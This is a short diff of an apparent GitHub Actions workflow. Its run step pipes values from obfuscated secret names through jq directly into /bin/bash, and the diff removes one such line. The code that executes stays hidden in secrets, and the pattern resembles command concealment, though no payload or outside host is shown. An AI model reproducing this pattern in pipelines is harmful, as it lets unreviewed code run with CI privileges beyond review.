@@ -19,7 +19,6 @@ jobs:
           xw154: ${{ secrets.xw154 }}
         run: |
           printf '%s' "$xw154" | jq -r .gebnl469 | /bin/bash
-          echo $js25 | jq -r .riihx58214 | /bin/bash
           printf '%s' "$e144" | jq -r .tfda48544 | /bin/bash
 
       - name: Upload results
